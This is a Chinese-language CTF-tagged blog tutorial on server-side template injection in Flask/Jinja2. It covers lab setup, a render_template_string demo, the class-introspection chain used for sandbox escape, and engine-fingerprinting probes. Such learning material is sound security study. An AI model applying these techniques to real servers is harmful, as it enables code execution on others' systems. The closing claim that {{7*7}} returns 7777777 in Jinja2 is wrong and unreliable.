@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>SSTI模板注入学习 | 林中小屋</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SSTI模板注入根据yu22x师傅文章SSTI模板注入绕过（进阶篇）复现学习。 何为SSTI?SSTI,服务器端模板注入  当服务端接受到攻击者的输入时，将其作为Web应用模板内容的一部分 在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容从而导致信息泄露、代码执行、GetShell等问题 其影响范围主要取决于模版引擎的复杂性  模板注入问题主要出现的框架: 123Python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI模板注入学习">
+<meta property="og:url" content="http://antipassion.github.io/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="林中小屋">
+<meta property="og:description" content="SSTI模板注入根据yu22x师傅文章SSTI模板注入绕过（进阶篇）复现学习。 何为SSTI?SSTI,服务器端模板注入  当服务端接受到攻击者的输入时，将其作为Web应用模板内容的一部分 在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容从而导致信息泄露、代码执行、GetShell等问题 其影响范围主要取决于模版引擎的复杂性  模板注入问题主要出现的框架: 123Python">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112191610984.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112192857473.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112192943030.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195457706.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195516227.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195544031.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195644460.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200107716.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200115816.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200644606.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200908111.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201454136.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201647088.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201854287.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112203903757.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112205055945.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112210103765.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113112306415.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113112917262.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113114225347.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113122531519.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113123000881.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113123437182.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113124027351.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113130142634.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113132357745.png">
+<meta property="og:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113132557089.png">
+<meta property="article:published_time" content="2021-11-12T11:02:54.000Z">
+<meta property="article:modified_time" content="2021-11-13T06:17:19.323Z">
+<meta property="article:author" content="Nayon|1163875625@qq.com">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://antipassion.github.io/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112191610984.png">
+  
+    <link rel="alternative" href="/atom.xml" title="林中小屋" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">主页</a></li>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/Nayon">author</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mailto"  target="_blank" href="/1163875625@qq.com" title="mailto">mailto</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/PE%E7%BB%93%E6%9E%84/" style="font-size: 20px;">PE结构</a> <a href="/tags/ctf/" style="font-size: 13.33px;">ctf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 16.67px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://fk0x075.github.io/">117</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://alikon.art/">Nagarita</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://0range-x.github.io/">0r@nge</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://txluck.github.io/">永安寺</a>
+                    
+                    </div>
+                </section>
+                
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/Nayon">author</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mailto" target="_blank" href="/1163875625@qq.com" title="mailto">mailto</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-SSTI模板注入学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2021-11-12T11:02:54.000Z" itemprop="datePublished">2021-11-12</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SSTI模板注入学习
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h2><p>根据yu22x师傅文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163671502616780271551002%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163671502616780271551002&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-110220425.pc_v2_rank_blog_default&utm_term=ssti&spm=1018.2226.3001.4450">SSTI模板注入绕过（进阶篇）</a>复现学习。</p>
+<h3 id="何为SSTI"><a href="#何为SSTI" class="headerlink" title="何为SSTI?"></a>何为SSTI?</h3><p>SSTI,服务器端模板注入</p>
+<ul>
+<li>当服务端接受到攻击者的输入时，将其作为Web应用模板内容的一部分</li>
+<li>在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容从而导致信息泄露、代码执行、GetShell等问题</li>
+<li>其影响范围主要取决于模版引擎的复杂性</li>
+</ul>
+<p>模板注入问题主要出现的框架:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python :jinja2、mako、tornado、django</span><br><span class="line">php: smarty、twig</span><br><span class="line">java： jade、velocity</span><br></pre></td></tr></table></figure>
+
+<h3 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结:"></a>概念总结:</h3><p>​    模板引擎用于将用户数据结合预先设计好的模板代码结合，生成一套属于用户自己的前端html页面，反馈给客户端浏览器于用户使用。</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112191610984.png" alt="image-20211112191610984"></p>
+<p>但由于模板引擎往往会存在一些安全问题，虽说模板引擎存在沙箱隔离机制，但由于设计的不严格，同样存在沙箱逃逸技术来绕过，达到引入模块执行命令，读取文件的效果。</p>
+<h4 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h4><ul>
+<li>前端渲染（SPA，单页面使用）</li>
+</ul>
+<p>浏览器从服务器得到一些信息( 可能是 JSON 等各种数据交换格式所封装的数据包 , 也可能是合法的 HTML 字符串 )<br>浏览器将这些信息排列组合成人类可读的 HTML 字符串 . 然后解析为最终的 HTML 页面呈现给用户<br>整个过程都是由客户端浏览器完成的 , 因此对服务器后端的压力较小 , 仅需要传输数据即可</p>
+<ul>
+<li>后端渲染（SSR，服务端渲染）</li>
+</ul>
+<p>浏览器会直接接收到经过服务器计算并排列过的字符串，浏览器仅需要对其进行解析，呈现给用户即可，对数据的采集和渲染都由服务端完成，因此对客户端浏览器的压力较小，对服务端的压力较大。</p>
+<h3 id="Flask模板"><a href="#Flask模板" class="headerlink" title="Flask模板"></a>Flask模板</h3><p><strong>环境搭建</strong></p>
+<p>利用Pycharm 内置Flask框架进行学习复现</p>
+<p>在左上角选择file-&gt;new project-&gt;Flask</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112192857473.png" alt="image-20211112192857473"></p>
+<p>Flask框架默认服务端口为5000，运行后访问<a href="http://127.0.0.1:5000检查是否成功运行。">http://127.0.0.1:5000检查是否成功运行。</a></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112192943030.png" alt="image-20211112192943030"></p>
+<p>右上方配置run/debug模式，方便我们观察内容更新的结果，实际运行环境时不可开启DEBUG模式。（此处不知为何一直有告警产生）。</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195457706.png" alt="image-20211112195457706"></p>
+<p><strong>渲染方法</strong></p>
+<p>Flask中的渲染方法分为两种:<code>render_template()</code> 和 <code>render_template_string()</code> </p>
+<ul>
+<li><p><code>render_template()</code>函数</p>
+<p>渲染一个指定的文件，这个指定的文件就是指模板</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195516227.png" alt="image-20211112195516227"></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195544031.png" alt="image-20211112195544031"></p>
+</li>
+</ul>
+<p>根据<code>@app_route(&#39;/hello&#39;)</code>设置的路由，路径指向hello时，利用render_template函数渲染hello.html，并将结果返回给客户端浏览器</p>
+<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195644460.png" alt="image-20211112195644460"></p>
+<ul>
+<li><p><code>render_template_string()</code> 函数</p>
+<p>用于渲染字符串</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200107716.png" alt="image-20211112200107716"></p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200115816.png" alt="image-20211112200115816"></p>
+</li>
+</ul>
+<p>注：SSTI与<code>render_template_string()</code> 函数密不可分</p>
+<h3 id="SSTI原理"><a href="#SSTI原理" class="headerlink" title="SSTI原理"></a>SSTI原理</h3><p>测试demo：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/demo&#x27;</span></span>) </span><span class="comment">#测试demo</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    html=<span class="string">&#x27;&#123;&#123;2*2&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html)</span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200644606.png" alt="image-20211112200644606"></p>
+<p>可以看到，demo路由下的2*2被<code>render_template_string()</code>渲染后执行了；</p>
+<p>再让我们试一试<code>render_template()</code>的效果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/demo&#x27;</span></span>) </span><span class="comment">#测试demo</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    html=<span class="string">&#x27;&#123;&#123;2*2&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200908111.png" alt="image-20211112200908111"></p>
+<p>可以看到环境500报错，这是由于render_template函数去寻找html变量所代表的的字符串所指向的模板去了，服务端找不到，返回500错误。</p>
+<p><strong>为什么<code>&#123;&#123;xxxxx&#125;&#125;</code>内的语句会被执行？</strong></p>
+<ul>
+<li>这是由于flask框架中，渲染引擎jinja2将<code>&#123;&#123;---&#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包含的语句被执行。</li>
+</ul>
+<h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><p>在上述demo中，虽说可以实现任意代码执行，但由于模板本身自带的沙盒安全机制，某些语句虽说可以执行，但会在执行中途被安全机制拦击。</p>
+<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201454136.png" alt="image-20211112201454136"></p>
+<p>即使在服务器端将os包含进去，但由于渲染时。模板引擎会对程序行为进行严格限制，导致无法执行命令</p>
+<p>沙箱逃离流程</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201647088.png" alt="image-20211112201647088"></p>
+<p>借助的主要是各个类之间的继承关系</p>
+<p>Python flask部分内建的魔术方法:</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201854287.png" alt="image-20211112201854287"></p>
+<ul>
+<li><code>__class__</code>：主要用于查看变量所属的类，根据前面的变量形式可以得到其所属的类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">sum</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">builtin_function_or_method</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__base__</code>: 用于查看类的基类，也可是使用数组索引来引来查看特定位置的值</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;,)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__mro__</code>: 也可获得基类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]	<span class="comment">#利用索引拿到指定的信息</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>SSTI利用主要是活用各种魔术方法</p>
+<h3 id="引擎判断"><a href="#引擎判断" class="headerlink" title="引擎判断"></a>引擎判断</h3><p>服务端所使用的的各种引擎支持的语法是不同的</p>
+<p>所以在找到SSTI注入点之后，我们首先应该先判断模板所使用的渲染引擎是什么，这样才能有针对性的构造对应引擎的Payload</p>
+<p>通常可用以下payload进行测试:</p>
+<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112203903757.png" alt="image-20211112203903757"></p>
+<p>绿色表示执行成功，红色表示执行失败</p>
+<p>注意:<code>&#123;&#123;7*7&#125;&#125;</code> 在Twig引擎中返回49，在Jinja2中返回7777777</p>
